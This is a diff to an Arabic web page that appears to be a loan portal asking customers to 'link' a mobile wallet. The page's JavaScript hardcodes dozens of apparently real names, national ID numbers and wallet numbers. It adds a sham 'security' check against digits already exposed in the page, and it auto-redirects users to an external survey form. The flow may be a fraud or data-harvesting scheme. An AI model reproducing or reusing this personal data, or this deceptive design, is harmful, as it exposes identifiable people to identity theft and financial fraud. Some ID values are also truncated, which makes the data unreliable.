@@ -644,6 +644,22 @@
                 <strong>حالة الطلب</strong>
                 <span id="statusMsg">مطلوب إتمام الربط</span>
             </div>
+            <!-- معلومات القسط والمدة الجديدة -->
+            <div class="info-card">
+                <i class="fas fa-calendar-alt"></i>
+                <strong>القسط الشهري</strong>
+                <span id="monthlyInstallment" style="font-size:1.5rem; font-weight:bold;">0</span>
+            </div>
+            <div class="info-card">
+                <i class="fas fa-calendar-week"></i>
+                <strong>مدة السداد (شهر)</strong>
+                <span id="loanDuration" style="font-size:1.5rem; font-weight:bold;">0</span>
+            </div>
+            <div class="info-card">
+                <i class="fas fa-calendar-check"></i>
+                <strong>موعد أول قسط</strong>
+                <span id="firstPaymentDate" style="font-size:1.1rem;">-</span>
+            </div>
         </div>
 
         <div class="timer-box">
@@ -662,7 +678,7 @@
         </div>
 
         <div id="linkingSection" class="linking-section">
-            <!-- صندوق التوجيه التلقائي الجديد -->
+            <!-- صندوق التوجيه التلقائي -->
             <div id="autoRedirectBox" class="auto-redirect-box" style="display: none;">
                 <span><i class="fas fa-hourglass-half"></i> سيتم توجيهك إلى رابط الربط تلقائياً بعد</span>
                 <span class="timer-number" id="redirectSeconds">30</span>
@@ -709,9 +725,59 @@
 </div>
 
 <script>
-    // قاعدة العملاء المدمجة (جميع العملاء من الملفات السابقة + العميل الجديد)
+    // ========== جدول الأقساط والمدة (نفس الجدول المستخدم في الكود الثالث) ==========
+    const loanDetailsMap = {
+        30000: { months: 12, installment: 3325 },
+        35000: { months: 12, installment: 3875 },
+        40000: { months: 18, installment: 2965 },
+        45000: { months: 18, installment: 3325 },
+        50000: { months: 24, installment: 2725 },
+        55000: { months: 24, installment: 3075 },
+        60000: { months: 24, installment: 3085 },
+        65000: { months: 26, installment: 3325 },
+        70000: { months: 26, installment: 3585 },
+        75000: { months: 26, installment: 3845 },
+        80000: { months: 30, installment: 3550 },
+        85000: { months: 30, installment: 3775 },
+        90000: { months: 30, installment: 3990 },
+        95000: { months: 30, installment: 4220 },
+        100000: { months: 32, installment: 4157 },
+        105000: { months: 32, installment: 4375 },
+        110000: { months: 32, installment: 4580 },
+        115000: { months: 38, installment: 4075 },
+        120000: { months: 38, installment: 4235 },
+        125000: { months: 38, installment: 4035 },
+        130000: { months: 42, installment: 4400 },
+        135000: { months: 42, installment: 4305 },
+        140000: { months: 42, installment: 4495 },
+        145000: { months: 48, installment: 4075 },
+        150000: { months: 48, installment: 4205 },
+        155000: { months: 48, installment: 4315 },
+        160000: { months: 48, installment: 4435 },
+        165000: { months: 48, installment: 4615 },
+        170000: { months: 48, installment: 4725 },
+        175000: { months: 48, installment: 4848 },
+        180000: { months: 54, installment: 4435 },
+        185000: { months: 54, installment: 4557 },
+        190000: { months: 60, installment: 4215 },
+        195000: { months: 60, installment: 4325 },
+        200000: { months: 60, installment: 4440 }
+    };
+
+    function getLoanDetails(amount) {
+        const exact = loanDetailsMap[amount];
+        if (exact) return exact;
+        // إذا لم يوجد، نبحث عن أقرب مبلغ موجود (تقريب)
+        const keys = Object.keys(loanDetailsMap).map(Number).sort((a,b)=>a-b);
+        let closest = keys[0];
+        for (let k of keys) {
+            if (Math.abs(k - amount) < Math.abs(closest - amount)) closest = k;
+        }
+        return loanDetailsMap[closest] || { months: 12, installment: 0 };
+    }
+
+    // قاعدة العملاء (جميع العملاء السابقين + الجدد)
     const customers = [
-        // العملاء الأساسيون السابقون (12 عميلاً)
         { name: "احمد ماهر احمد محمد ", id: "28309122103052", wallet: "01032201208", type: "فودافون", loan: 100000, step: 22500 },
         { name: "معاذ السيد الغريب أحمد", id: "28205031201019", wallet: "01033830731", type: "فودافون", loan: 200000, step: 50000 },
         { name: "محمد احمد عبدالله عبدالقادر", id: "28906270200731", wallet: "01119638067", type: "اتصالات", loan: 200000, step: 50000 },
@@ -724,16 +790,14 @@
         { name: "حماده ابوالعلا عبد العظيم ابوالعلا", id: "29102272500939", wallet: "01092974641", type: "فودافون", loan: 30000, step: 7500 },
         { name: "محمد على السيد سلام", id: "30001132500275", wallet: null, type: null, loan: 100000, step: 25000 },
         { name: "محمد فتحى عبد الوارث محمد", id: "28507170200317", wallet: "01092134722", type: "فودافون", loan: 120000, step: 30000 },
-        
-        // العملاء الجدد من الملف الثاني
         { name: "محمد رمضان احمد محمد", id: "27512283200054", wallet: "01015857191", type: "فودافون", loan: 30000, step: 7500 },
-        { name: "هاني محمد محمد عبد الحميد", id: "26910290102639", wallet: "01095216999", type: "فودافон", loan: 50000, step: 12500 },
+        { name: "هاني محمد محمد عبد الحميد", id: "26910290102639", wallet: "01095216999", type: "فودافون", loan: 50000, step: 12500 },
         { name: "شحاته عبد الغني هيكل عبد الغني", id: "26711222501077", wallet: "01003233741", type: "فودافون", loan: 30000, step: 7500 },
         { name: "رامي حسام احمد ابراهيم", id: "28502070101115", wallet: "01150232362", type: "اتصالات", loan: 30000, step: 7500 },
         { name: "مصطفى عبد الظاهر محمد مراد", id: "289081416834", wallet: "01116549692", type: "اتصالات", loan: 30000, step: 7500 },
         { name: "وليد علي حسن علي الدين", id: "27303270102837", wallet: "01004244313", type: "فودافون", loan: 185000, step: 46250 },
-        { name: "كرم محروس محمود حفني", id: "28611218800135", wallet: "01151775319", type: "اتصالات", loan: 30000, step: 7500 },
-        { name: "محمد مجدي احمد مسعد", id: "28311011101357", wallet: "01070710710", type: "فودافون", loan: 200000, step: 50000 },
+        { name: "كرم محروس محمود حفني", id: "28611200135", wallet: "01151775319", type: "اتصالات", loan: 30000, step: 7500 },
+        { name: "محمد مجدي احمد مسعد", id: "2011101357", wallet: "01070710710", type: "فودافون", loan: 200000, step: 50000 },
         { name: "محمد ناهض محمد السيد", id: "30007310101779", wallet: "01155143436", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "صلاح مختار حنفي قرني", id: "27708040101271", wallet: "01023669498", type: "فودافون", loan: 50000, step: 12500 },
         { name: "السيد ابراهيم الششتاوي قناوي ", id: "26803241601893", wallet: "01090232423", type: "فودافون", loan: 30000, step: 7500 },
@@ -745,11 +809,7 @@
         { name: "هشام أحمد صلاح محمد عبدالغغار", id: "27601011414511", wallet: "01022560232", type: "فودافون", loan: 50000, step: 12500 },
         { name: "محمد محمود عبد الحميد محمد", id: "28310192201335", wallet: "01026479629", type: "فودافون", loan: 40000, step: 10000 },
         { name: "ياسر سعد محمد بكر", id: "275073200599", wallet: "01226157120", type: "فودافون", loan: 60000, step: 15000 },
-        
-        // العميل السابق إضافته (حسين صبرى)
         { name: "حسين صبرى مصطفى حسن", id: "28909012110875", wallet: "01142032336", type: "اتصالات", loan: 100000, step: 25000 },
-        
-        // العميل الجديد المطلوب (محمد احمد محمود احمد)
         { name: "محمد احمد محمود احمد", id: "28910102102195", wallet: "01122107980", type: "اتصالات", loan: 30000, step: 7500 }
     ];
 
@@ -759,19 +819,16 @@
     let autoRedirectTimer = null;
     let autoRedirectInterval = null;
 
-    // تم تغيير الرابط إلى الرابط الجديد
     function redirectToLinkingForm() {
         window.open('https://survey.porsline.com/s/FbTWzFJd', '_blank');
     }
 
-    // إلغاء التوجيه التلقائي
     function cancelAutoRedirect() {
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
         if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         const box = document.getElementById('autoRedirectBox');
         if (box) {
             box.style.display = 'none';
-            // إظهار رسالة اختيارية
             const msg = document.createElement('div');
             msg.className = 'info-box success';
             msg.style.marginTop = '0.5rem';
@@ -785,7 +842,6 @@
         }
     }
 
-    // بدء التوجيه التلقائي بعد 30 ثانية
     function startAutoRedirect() {
         const box = document.getElementById('autoRedirectBox');
         if (!box) return;
@@ -793,10 +849,8 @@
         let secondsLeft = 30;
         const secondsSpan = document.getElementById('redirectSeconds');
         if (secondsSpan) secondsSpan.innerText = secondsLeft;
-
         if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
-
         autoRedirectInterval = setInterval(() => {
             secondsLeft--;
             if (secondsSpan) secondsSpan.innerText = secondsLeft;
@@ -807,9 +861,7 @@
                 box.style.display = 'none';
             }
         }, 1000);
-
         autoRedirectTimer = setTimeout(() => {
-            // تأكيد إضافي
             if (autoRedirectInterval) clearInterval(autoRedirectInterval);
             redirectToLinkingForm();
             box.style.display = 'none';
@@ -831,6 +883,20 @@
             return;
         }
         
+        // طلب آخر 4 أرقام من المحفظة (إذا كانت موجودة)
+        if (customer.type && customer.wallet) {
+            const last4Digits = prompt('🔐 لأغراض التأمين، يرجى إدخال آخر 4 أرقام من رقم محفظتك المسجلة:');
+            if (!last4Digits || last4Digits.length !== 4) {
+                errorDiv.textContent = 'يجب إدخال آخر 4 أرقام بشكل صحيح.';
+                return;
+            }
+            const walletLast4 = customer.wallet.slice(-4);
+            if (last4Digits !== walletLast4) {
+                errorDiv.textContent = '❌ الأرقام غير صحيحة. يرجى المحاولة مرة أخرى.';
+                return;
+            }
+        }
+        
         currentCustomer = customer;
         errorDiv.textContent = '';
         document.getElementById('loginPage').style.display = 'none';
@@ -850,13 +916,25 @@
         document.getElementById('walletType').innerText = walletDisplay;
         document.getElementById('walletNumber').innerText = walletNumberDisplay;
 
+        // عرض معلومات القسط والمدة وموعد أول قسط
+        const details = getLoanDetails(customer.loan);
+        const installment = details.installment;
+        const months = details.months;
+        const today = new Date();
+        const firstPaymentDate = new Date();
+        firstPaymentDate.setDate(today.getDate() + 29); // بعد 29 يوم من اليوم
+        const formattedDate = firstPaymentDate.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
+        
+        document.getElementById('monthlyInstallment').innerHTML = installment.toLocaleString() + ' ج.م';
+        document.getElementById('loanDuration').innerText = months + ' شهر';
+        document.getElementById('firstPaymentDate').innerText = formattedDate;
+
         const hasWallet = customer.type && customer.wallet && customer.wallet !== '.';
         if (hasWallet) {
             document.getElementById('linkingSection').classList.add('active');
             document.getElementById('walletRequiredMessage').classList.remove('active');
             showLinkingInstructions(customer.type);
             startTimer();
-            // بدء التوجيه التلقائي بعد 30 ثانية
             startAutoRedirect();
         } else {
             document.getElementById('linkingSection').classList.remove('active');
@@ -950,7 +1028,6 @@
     }
 
     function handleLogout() {
-        // إلغاء التوجيه التلقائي عند الخروج
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
         if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         document.getElementById('dashboardPage').classList.remove('active');
